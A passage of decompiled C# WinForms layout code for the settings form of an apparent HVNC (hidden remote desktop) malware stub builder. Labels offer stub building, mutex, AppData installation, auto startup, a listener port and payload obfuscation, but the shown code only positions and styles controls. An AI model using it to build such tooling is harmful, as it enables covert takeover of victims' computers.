			guna2ControlBox1.Location = new System.Drawing.Point(381, 15);
			guna2ControlBox1.Name = "guna2ControlBox1";
			guna2ControlBox1.ShadowDecoration.Parent = guna2ControlBox1;
			guna2ControlBox1.ShowIcon = false;
			guna2ControlBox1.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox1.TabIndex = 0;
			guna2ControlBox1.UseTransparentBackground = true;
			guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
			guna2DragControl1.TargetControl = panel1;
			guna2DragControl1.UseTransparentDrag = true;
			label7.AutoSize = true;
			label7.BackColor = System.Drawing.Color.Transparent;
			label7.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label7.Location = new System.Drawing.Point(23, 422);
			label7.Name = "label7";
			label7.Size = new System.Drawing.Size(69, 16);
			label7.TabIndex = 13;
			label7.Text = "File name :";
			label6.AutoSize = true;
			label6.BackColor = System.Drawing.Color.Transparent;
			label6.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label6.Location = new System.Drawing.Point(219, 192);
			label6.Name = "label6";
			label6.Size = new System.Drawing.Size(101, 16);
			label6.TabIndex = 10;
			label6.Text = "Random Folder :";
			label5.AutoSize = true;
			label5.BackColor = System.Drawing.Color.Transparent;
			label5.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label5.Location = new System.Drawing.Point(23, 354);
			label5.Name = "label5";
			label5.Size = new System.Drawing.Size(132, 16);
			label5.TabIndex = 8;
			label5.Text = "Installation Location :";
			label3.AutoSize = true;
			label3.BackColor = System.Drawing.Color.Transparent;
			label3.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label3.Location = new System.Drawing.Point(219, 52);
			label3.Name = "label3";
			label3.Size = new System.Drawing.Size(100, 16);
			label3.TabIndex = 5;
			label3.Text = "HVNC  Version :";
			label4.AutoSize = true;
			label4.BackColor = System.Drawing.Color.Transparent;
			label4.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label4.Location = new System.Drawing.Point(219, 105);
			label4.Name = "label4";
			label4.Size = new System.Drawing.Size(99, 16);
			label4.TabIndex = 8;
			label4.Text = "Process Mutex:";
			txtIdentifier.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			txtIdentifier.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtIdentifier.DefaultText = "C++";
			txtIdentifier.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			txtIdentifier.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			txtIdentifier.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtIdentifier.DisabledState.Parent = txtIdentifier;
			txtIdentifier.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtIdentifier.FillColor = System.Drawing.Color.Black;
			txtIdentifier.FocusedState.BorderColor = System.Drawing.Color.White;
			txtIdentifier.FocusedState.Parent = txtIdentifier;
			txtIdentifier.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtIdentifier.ForeColor = System.Drawing.Color.White;
			txtIdentifier.HoverState.BorderColor = System.Drawing.Color.White;
			txtIdentifier.HoverState.Parent = txtIdentifier;
			txtIdentifier.Location = new System.Drawing.Point(222, 71);
			txtIdentifier.Name = "txtIdentifier";
			txtIdentifier.PasswordChar = '\0';
			txtIdentifier.PlaceholderText = "";
			txtIdentifier.SelectedText = "";
			txtIdentifier.ShadowDecoration.Parent = txtIdentifier;
			txtIdentifier.Size = new System.Drawing.Size(167, 24);
			txtIdentifier.TabIndex = 17;
			guna2HtmlToolTip1.SetToolTip(txtIdentifier, "Selected Stub!");
			txtMutex.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			txtMutex.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtMutex.DefaultText = "";
			txtMutex.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			txtMutex.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			txtMutex.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtMutex.DisabledState.Parent = txtMutex;
			txtMutex.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtMutex.FillColor = System.Drawing.Color.Black;
			txtMutex.FocusedState.BorderColor = System.Drawing.Color.White;
			txtMutex.FocusedState.Parent = txtMutex;
			txtMutex.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtMutex.ForeColor = System.Drawing.Color.White;
			txtMutex.HoverState.BorderColor = System.Drawing.Color.White;
			txtMutex.HoverState.Parent = txtMutex;
			txtMutex.Location = new System.Drawing.Point(222, 125);
			txtMutex.Name = "txtMutex";
			txtMutex.PasswordChar = '\0';
			txtMutex.PlaceholderText = "";
			txtMutex.SelectedText = "";
			txtMutex.ShadowDecoration.Parent = txtMutex;
			txtMutex.Size = new System.Drawing.Size(167, 24);
			txtMutex.TabIndex = 17;
			guna2HtmlToolTip1.SetToolTip(txtMutex, "Mutex!");
			textBox2.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			textBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
			textBox2.DefaultText = "";
			textBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			textBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			textBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox2.DisabledState.Parent = textBox2;
			textBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox2.FillColor = System.Drawing.Color.Black;
			textBox2.FocusedState.BorderColor = System.Drawing.Color.White;
			textBox2.FocusedState.Parent = textBox2;
			textBox2.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			textBox2.ForeColor = System.Drawing.Color.White;
			textBox2.HoverState.BorderColor = System.Drawing.Color.White;
			textBox2.HoverState.Parent = textBox2;
			textBox2.Location = new System.Drawing.Point(26, 441);
			textBox2.Name = "textBox2";
			textBox2.PasswordChar = '\0';
			textBox2.PlaceholderText = "";
			textBox2.SelectedText = "";
			textBox2.ShadowDecoration.Parent = textBox2;
			textBox2.Size = new System.Drawing.Size(167, 24);
			textBox2.TabIndex = 17;
			guna2HtmlToolTip1.SetToolTip(textBox2, "File name!");
			textBox1.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			textBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
			textBox1.DefaultText = "";
			textBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			textBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			textBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox1.DisabledState.Parent = textBox1;
			textBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox1.FillColor = System.Drawing.Color.Black;
			textBox1.FocusedState.BorderColor = System.Drawing.Color.White;
			textBox1.FocusedState.Parent = textBox1;
			textBox1.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			textBox1.ForeColor = System.Drawing.Color.White;
			textBox1.HoverState.BorderColor = System.Drawing.Color.White;
			textBox1.HoverState.Parent = textBox1;
			textBox1.Location = new System.Drawing.Point(222, 211);
			textBox1.Name = "textBox1";
			textBox1.PasswordChar = '\0';
			textBox1.PlaceholderText = "";
			textBox1.SelectedText = "";
			textBox1.ShadowDecoration.Parent = textBox1;
			textBox1.Size = new System.Drawing.Size(167, 24);
			textBox1.TabIndex = 17;
			guna2HtmlToolTip1.SetToolTip(textBox1, "Random folder name!");
			RandomMutexBtn.Animated = true;
			RandomMutexBtn.BackColor = System.Drawing.Color.Black;
			RandomMutexBtn.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			RandomMutexBtn.BorderThickness = 1;
			RandomMutexBtn.CheckedState.Parent = RandomMutexBtn;
			RandomMutexBtn.CustomImages.Parent = RandomMutexBtn;
			RandomMutexBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			RandomMutexBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			RandomMutexBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			RandomMutexBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			RandomMutexBtn.DisabledState.Parent = RandomMutexBtn;
			RandomMutexBtn.FillColor = System.Drawing.Color.Black;
			RandomMutexBtn.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			RandomMutexBtn.ForeColor = System.Drawing.Color.White;
			RandomMutexBtn.HoverState.BorderColor = System.Drawing.Color.White;
			RandomMutexBtn.HoverState.FillColor = System.Drawing.Color.Black;
			RandomMutexBtn.HoverState.Parent = RandomMutexBtn;
			RandomMutexBtn.Location = new System.Drawing.Point(222, 155);
			RandomMutexBtn.Name = "RandomMutexBtn";
			RandomMutexBtn.PressedColor = System.Drawing.Color.FromArgb(9, 248, 121);
			RandomMutexBtn.ShadowDecoration.Parent = RandomMutexBtn;
			RandomMutexBtn.Size = new System.Drawing.Size(167, 25);
			RandomMutexBtn.TabIndex = 18;
			RandomMutexBtn.Text = "Random";
			RandomMutexBtn.Click += new System.EventHandler(button2_Click);
			comboBox1.BackColor = System.Drawing.Color.Transparent;
			comboBox1.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			comboBox1.BorderThickness = 3;
			comboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
			comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
			comboBox1.FillColor = System.Drawing.Color.Black;
			comboBox1.FocusedColor = System.Drawing.Color.White;
			comboBox1.FocusedState.BorderColor = System.Drawing.Color.White;
			comboBox1.FocusedState.Parent = comboBox1;
			comboBox1.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			comboBox1.ForeColor = System.Drawing.Color.Gainsboro;
			comboBox1.HoverState.Parent = comboBox1;
			comboBox1.ItemHeight = 30;
			comboBox1.Items.AddRange(new object[3] { "%AppData%\\Local", "%AppData%\\Roaming", "%AppData%\\Local\\Temp" });
			comboBox1.ItemsAppearance.Parent = comboBox1;
			comboBox1.Location = new System.Drawing.Point(26, 374);
			comboBox1.Name = "comboBox1";
			comboBox1.ShadowDecoration.Parent = comboBox1;
			comboBox1.Size = new System.Drawing.Size(167, 36);
			comboBox1.TabIndex = 18;
			comboBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
			RandomFolderName.Animated = true;
			RandomFolderName.BackColor = System.Drawing.Color.Black;
			RandomFolderName.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			RandomFolderName.BorderThickness = 1;
			RandomFolderName.CheckedState.Parent = RandomFolderName;
			RandomFolderName.CustomImages.Parent = RandomFolderName;
			RandomFolderName.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			RandomFolderName.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			RandomFolderName.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			RandomFolderName.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			RandomFolderName.DisabledState.Parent = RandomFolderName;
			RandomFolderName.FillColor = System.Drawing.Color.Black;
			RandomFolderName.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			RandomFolderName.ForeColor = System.Drawing.Color.White;
			RandomFolderName.HoverState.BorderColor = System.Drawing.Color.White;
			RandomFolderName.HoverState.FillColor = System.Drawing.Color.Black;
			RandomFolderName.HoverState.Parent = RandomFolderName;
			RandomFolderName.Location = new System.Drawing.Point(222, 244);
			RandomFolderName.Name = "RandomFolderName";
			RandomFolderName.PressedColor = System.Drawing.Color.FromArgb(9, 248, 121);
			RandomFolderName.ShadowDecoration.Parent = RandomFolderName;
			RandomFolderName.Size = new System.Drawing.Size(167, 25);
			RandomFolderName.TabIndex = 19;
			RandomFolderName.Text = "Random";
			RandomFolderName.Click += new System.EventHandler(button3_Click);
			label24.AutoSize = true;
			label24.BackColor = System.Drawing.Color.Transparent;
			label24.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label24.ForeColor = System.Drawing.Color.Gainsboro;
			label24.Location = new System.Drawing.Point(54, 325);
			label24.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label24.Name = "label24";
			label24.Size = new System.Drawing.Size(83, 16);
			label24.TabIndex = 81;
			label24.Text = "Auto Startup";
			guna2HtmlToolTip1.SetToolTip(label24, "Add to Startup!");
			chkEx.BackColor = System.Drawing.Color.Black;
			chkEx.CheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkEx.CheckedState.BorderRadius = 2;
			chkEx.CheckedState.BorderThickness = 2;
			chkEx.CheckedState.FillColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkEx.CheckedState.Parent = chkEx;
			chkEx.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			chkEx.ForeColor = System.Drawing.Color.White;
			chkEx.Location = new System.Drawing.Point(222, 335);
			chkEx.Name = "chkEx";
			chkEx.ShadowDecoration.Parent = chkEx;
			chkEx.Size = new System.Drawing.Size(23, 23);
			chkEx.TabIndex = 126;
			chkEx.Text = "guna2CustomCheckBox1";
			chkEx.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkEx.UncheckedState.BorderRadius = 2;
			chkEx.UncheckedState.BorderThickness = 2;
			chkEx.UncheckedState.FillColor = System.Drawing.Color.Black;
			chkEx.UncheckedState.Parent = chkEx;
			EnableStartUpBox.BackColor = System.Drawing.Color.Black;
			EnableStartUpBox.CheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			EnableStartUpBox.CheckedState.BorderRadius = 2;
			EnableStartUpBox.CheckedState.BorderThickness = 2;
			EnableStartUpBox.CheckedState.FillColor = System.Drawing.Color.FromArgb(9, 248, 121);
			EnableStartUpBox.CheckedState.Parent = EnableStartUpBox;
			EnableStartUpBox.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			EnableStartUpBox.ForeColor = System.Drawing.Color.White;
			EnableStartUpBox.Location = new System.Drawing.Point(26, 321);
			EnableStartUpBox.Name = "EnableStartUpBox";
			EnableStartUpBox.ShadowDecoration.Parent = EnableStartUpBox;
			EnableStartUpBox.Size = new System.Drawing.Size(23, 23);
			EnableStartUpBox.TabIndex = 126;
			EnableStartUpBox.Text = "guna2CustomCheckBox1";
			EnableStartUpBox.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			EnableStartUpBox.UncheckedState.BorderRadius = 2;
			EnableStartUpBox.UncheckedState.BorderThickness = 2;
			EnableStartUpBox.UncheckedState.FillColor = System.Drawing.Color.Black;
			EnableStartUpBox.UncheckedState.Parent = EnableStartUpBox;
			guna2GroupBox1.BackColor = System.Drawing.Color.Black;
			guna2GroupBox1.BorderColor = System.Drawing.Color.Black;
			guna2GroupBox1.BorderThickness = 5;
			guna2GroupBox1.Controls.Add(label20);
			guna2GroupBox1.Controls.Add(label19);
			guna2GroupBox1.Controls.Add(label16);
			guna2GroupBox1.Controls.Add(chkEncrypt);
			guna2GroupBox1.Controls.Add(chkRename);
			guna2GroupBox1.Controls.Add(label11);
			guna2GroupBox1.Controls.Add(label12);
			guna2GroupBox1.Controls.Add(label15);
			guna2GroupBox1.Controls.Add(hvncCplusListener);
			guna2GroupBox1.Controls.Add(label14);
			guna2GroupBox1.Controls.Add(label8);
			guna2GroupBox1.Controls.Add(chkC);
			guna2GroupBox1.Controls.Add(chkCplus);
			guna2GroupBox1.Controls.Add(guna2Button1);
			guna2GroupBox1.Controls.Add(label13);
			guna2GroupBox1.Controls.Add(txtIP);
			guna2GroupBox1.Controls.Add(txtPORT);
			guna2GroupBox1.Controls.Add(label2);
			guna2GroupBox1.Controls.Add(label1);
			guna2GroupBox1.Controls.Add(EnableStartUpBox);
			guna2GroupBox1.Controls.Add(label6);
			guna2GroupBox1.Controls.Add(guna2CustomCheckBox1);
			guna2GroupBox1.Controls.Add(chkHRDP);
			guna2GroupBox1.Controls.Add(chkEx);
			guna2GroupBox1.Controls.Add(txtMutex);
			guna2GroupBox1.Controls.Add(comboBox1);
			guna2GroupBox1.Controls.Add(label3);
			guna2GroupBox1.Controls.Add(textBox1);
			guna2GroupBox1.Controls.Add(label4);
			guna2GroupBox1.Controls.Add(label7);
			guna2GroupBox1.Controls.Add(label9);
			guna2GroupBox1.Controls.Add(label10);
			guna2GroupBox1.Controls.Add(label24);
			guna2GroupBox1.Controls.Add(label17);
			guna2GroupBox1.Controls.Add(RandomMutexBtn);
			guna2GroupBox1.Controls.Add(label5);
			guna2GroupBox1.Controls.Add(txtIdentifier);
			guna2GroupBox1.Controls.Add(WanBtn);
			guna2GroupBox1.Controls.Add(LANBtn);
			guna2GroupBox1.Controls.Add(RandomFolderName);
			guna2GroupBox1.Controls.Add(textBox2);
			guna2GroupBox1.Controls.Add(guna2Separator1);
			guna2GroupBox1.Controls.Add(guna2Separator2);
			guna2GroupBox1.CustomBorderColor = System.Drawing.Color.Black;
			guna2GroupBox1.FillColor = System.Drawing.Color.Transparent;
			guna2GroupBox1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2GroupBox1.ForeColor = System.Drawing.Color.Gainsboro;
			guna2GroupBox1.Location = new System.Drawing.Point(8, 67);
			guna2GroupBox1.Name = "guna2GroupBox1";
			guna2GroupBox1.ShadowDecoration.Parent = guna2GroupBox1;
			guna2GroupBox1.Size = new System.Drawing.Size(412, 497);
			guna2GroupBox1.TabIndex = 129;
			label20.AutoSize = true;
			label20.BackColor = System.Drawing.Color.Transparent;
			label20.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label20.Location = new System.Drawing.Point(250, 374);
			label20.Name = "label20";
			label20.Size = new System.Drawing.Size(123, 32);
			label20.TabIndex = 261;
			label20.Text = "Obfuscate/Encrypt\r\n     your Payload!";
			label19.AutoSize = true;
			label19.BackColor = System.Drawing.Color.Transparent;
			label19.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label19.ForeColor = System.Drawing.Color.Gainsboro;
			label19.Location = new System.Drawing.Point(250, 446);
			label19.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label19.Name = "label19";
			label19.Size = new System.Drawing.Size(103, 16);
			label19.TabIndex = 145;
			label19.Text = "Encrypt Payload";
			guna2HtmlToolTip1.SetToolTip(label19, "Obfuscate Payload!");
			label16.AutoSize = true;
			label16.BackColor = System.Drawing.Color.Transparent;
			label16.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label16.ForeColor = System.Drawing.Color.Gainsboro;
			label16.Location = new System.Drawing.Point(250, 420);
			label16.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label16.Name = "label16";
			label16.Size = new System.Drawing.Size(116, 16);
			label16.TabIndex = 144;
			label16.Text = "Rename Functions";
			guna2HtmlToolTip1.SetToolTip(label16, "Rename Functions!");
			chkEncrypt.BackColor = System.Drawing.Color.Black;
			chkEncrypt.CheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkEncrypt.CheckedState.BorderRadius = 2;
			chkEncrypt.CheckedState.BorderThickness = 2;
			chkEncrypt.CheckedState.FillColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkEncrypt.CheckedState.Parent = chkEncrypt;
			chkEncrypt.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			chkEncrypt.ForeColor = System.Drawing.Color.White;
			chkEncrypt.Location = new System.Drawing.Point(222, 443);
			chkEncrypt.Name = "chkEncrypt";
			chkEncrypt.ShadowDecoration.Parent = chkEncrypt;
			chkEncrypt.Size = new System.Drawing.Size(23, 23);
			chkEncrypt.TabIndex = 143;
			chkEncrypt.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkEncrypt.UncheckedState.BorderRadius = 2;
			chkEncrypt.UncheckedState.BorderThickness = 2;
			chkEncrypt.UncheckedState.FillColor = System.Drawing.Color.Black;
			chkEncrypt.UncheckedState.Parent = chkEncrypt;
			chkRename.BackColor = System.Drawing.Color.Black;
			chkRename.CheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkRename.CheckedState.BorderRadius = 2;
			chkRename.CheckedState.BorderThickness = 2;
			chkRename.CheckedState.FillColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkRename.CheckedState.Parent = chkRename;
			chkRename.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			chkRename.ForeColor = System.Drawing.Color.White;
			chkRename.Location = new System.Drawing.Point(222, 417);
			chkRename.Name = "chkRename";
			chkRename.ShadowDecoration.Parent = chkRename;
			chkRename.Size = new System.Drawing.Size(23, 23);
			chkRename.TabIndex = 142;
			chkRename.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkRename.UncheckedState.BorderRadius = 2;
			chkRename.UncheckedState.BorderThickness = 2;
			chkRename.UncheckedState.FillColor = System.Drawing.Color.Black;
			chkRename.UncheckedState.Parent = chkRename;
			label11.AutoSize = true;
			label11.BackColor = System.Drawing.Color.Transparent;
			label11.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label11.ForeColor = System.Drawing.Color.White;
			label11.Location = new System.Drawing.Point(260, 11);
			label11.Name = "label11";
			label11.Size = new System.Drawing.Size(89, 16);
			label11.TabIndex = 2;
			label11.Text = "Misc Settings";
			label12.AutoSize = true;
			label12.BackColor = System.Drawing.Color.Transparent;
			label12.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label12.ForeColor = System.Drawing.Color.White;
			label12.Location = new System.Drawing.Point(40, 11);
			label12.Name = "label12";
			label12.Size = new System.Drawing.Size(133, 16);
			label12.TabIndex = 2;
			label12.Text = "Connections Settings";
			label15.AutoSize = true;
			label15.BackColor = System.Drawing.Color.Transparent;
			label15.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label15.Location = new System.Drawing.Point(23, 246);
			label15.Name = "label15";
			label15.Size = new System.Drawing.Size(155, 16);
			label15.TabIndex = 139;
			label15.Text = "C++ HVNC Port Listener :";
			hvncCplusListener.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			hvncCplusListener.Cursor = System.Windows.Forms.Cursors.IBeam;
			hvncCplusListener.DefaultText = "4447";
			hvncCplusListener.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			hvncCplusListener.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			hvncCplusListener.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			hvncCplusListener.DisabledState.Parent = hvncCplusListener;
			hvncCplusListener.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			hvncCplusListener.FillColor = System.Drawing.Color.Black;
			hvncCplusListener.FocusedState.BorderColor = System.Drawing.Color.White;
			hvncCplusListener.FocusedState.Parent = hvncCplusListener;
			hvncCplusListener.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			hvncCplusListener.ForeColor = System.Drawing.Color.White;
			hvncCplusListener.HoverState.BorderColor = System.Drawing.Color.White;
			hvncCplusListener.HoverState.Parent = hvncCplusListener;
			hvncCplusListener.Location = new System.Drawing.Point(27, 266);
			hvncCplusListener.Name = "hvncCplusListener";
			hvncCplusListener.PasswordChar = '\0';
			hvncCplusListener.PlaceholderText = "";
			hvncCplusListener.SelectedText = "";
			hvncCplusListener.ShadowDecoration.Parent = hvncCplusListener;
			hvncCplusListener.Size = new System.Drawing.Size(167, 26);
			hvncCplusListener.TabIndex = 138;
			guna2HtmlToolTip1.SetToolTip(hvncCplusListener, "HVNC C++ version listener!");
			label14.AutoSize = true;
			label14.BackColor = System.Drawing.Color.Transparent;
			label14.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label14.ForeColor = System.Drawing.Color.Gainsboro;
			label14.Location = new System.Drawing.Point(250, 312);
			label14.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label14.Name = "label14";
			label14.Size = new System.Drawing.Size(58, 16);
			label14.TabIndex = 137;
			label14.Text = "C#  Stub";
			guna2HtmlToolTip1.SetToolTip(label14, "Build C# HVNC stub!");
			label8.AutoSize = true;
			label8.BackColor = System.Drawing.Color.Transparent;
			label8.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label8.ForeColor = System.Drawing.Color.Gainsboro;
			label8.Location = new System.Drawing.Point(250, 286);
			label8.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label8.Name = "label8";
			label8.Size = new System.Drawing.Size(64, 16);
			label8.TabIndex = 136;
			label8.Text = "C ++ Stub";
			guna2HtmlToolTip1.SetToolTip(label8, "Build C++ HVNC stub!");
			chkC.BackColor = System.Drawing.Color.Black;
			chkC.CheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkC.CheckedState.BorderRadius = 2;
			chkC.CheckedState.BorderThickness = 2;
			chkC.CheckedState.FillColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkC.CheckedState.Parent = chkC;
			chkC.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			chkC.ForeColor = System.Drawing.Color.White;
			chkC.Location = new System.Drawing.Point(222, 309);
			chkC.Name = "chkC";
			chkC.ShadowDecoration.Parent = chkC;
			chkC.Size = new System.Drawing.Size(23, 23);
			chkC.TabIndex = 135;
			chkC.Text = "guna2CustomCheckBox3";
			chkC.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkC.UncheckedState.BorderRadius = 2;
			chkC.UncheckedState.BorderThickness = 2;
			chkC.UncheckedState.FillColor = System.Drawing.Color.Black;
			chkC.UncheckedState.Parent = chkC;
			chkC.CheckedChanged += new System.EventHandler(chkC_CheckedChanged);
			chkCplus.BackColor = System.Drawing.Color.Black;
			chkCplus.CheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkCplus.CheckedState.BorderRadius = 2;
			chkCplus.CheckedState.BorderThickness = 2;
			chkCplus.CheckedState.FillColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkCplus.CheckedState.Parent = chkCplus;
			chkCplus.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			chkCplus.ForeColor = System.Drawing.Color.White;
			chkCplus.Location = new System.Drawing.Point(222, 283);
			chkCplus.Name = "chkCplus";
			chkCplus.ShadowDecoration.Parent = chkCplus;
			chkCplus.Size = new System.Drawing.Size(23, 23);
			chkCplus.TabIndex = 134;
			chkCplus.Text = "guna2CustomCheckBox2";
			chkCplus.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkCplus.UncheckedState.BorderRadius = 2;
			chkCplus.UncheckedState.BorderThickness = 2;
			chkCplus.UncheckedState.FillColor = System.Drawing.Color.Black;
			chkCplus.UncheckedState.Parent = chkCplus;
			chkCplus.CheckedChanged += new System.EventHandler(chkCplus_CheckedChanged);
			guna2Button1.Animated = true;
			guna2Button1.BackColor = System.Drawing.Color.Black;
			guna2Button1.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button1.BorderThickness = 1;
			guna2Button1.CheckedState.Parent = guna2Button1;
			guna2Button1.CustomImages.Parent = guna2Button1;
			guna2Button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			guna2Button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2Button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			guna2Button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
